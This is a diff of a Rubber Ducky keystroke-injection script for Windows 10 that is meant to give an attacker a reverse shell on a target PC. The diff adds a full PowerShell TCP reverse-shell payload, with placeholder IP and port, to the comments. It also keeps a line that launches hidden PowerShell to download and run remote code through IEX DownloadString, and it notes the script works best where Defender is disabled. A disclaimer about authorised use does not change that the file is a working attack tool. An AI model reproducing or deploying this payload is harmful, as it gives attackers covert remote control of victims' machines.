@@ -1,6 +1,10 @@
-
-REM Author: makozort Title: Hidden_access Target: windows 10 Description: gain a reverse shell to targets pc, the script works VERY qucikly agains machines with disabled defender
+REM Author: makozort 
+REM Title: Hidden_access 
+REM Target: windows 10 
+REM Description: gain a reverse shell to targets pc, the script works VERY qucikly agains machines with disabled defender
 REM THIS SCRIPT IS INTENDED FOR USE ON SYSTEMS YOU OWN OR HAVE BEEN GIVEN PERMISSION TO USE, I TAKE NO RESPONSIBILITIES FOR ANY MISUSE
+REM This is the rs.ps1 to host
+REM $client = New-Object System.Net.Sockets.TCPClient("{IP here}",{PORT HERE});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 DELAY 1000
 CTRL ESC
 DELAY 300
@@ -29,4 +33,5 @@ REM open up powershell in hidden mode, run the command (the rs.ps1 that needs to
 STRING powershell -w hidden IEX (New-Object Net.WebClient).DownloadString('LINK HERE');
 ENTER
 DELAY 600
-LEFT ENTER
+LEFT
+ENTER
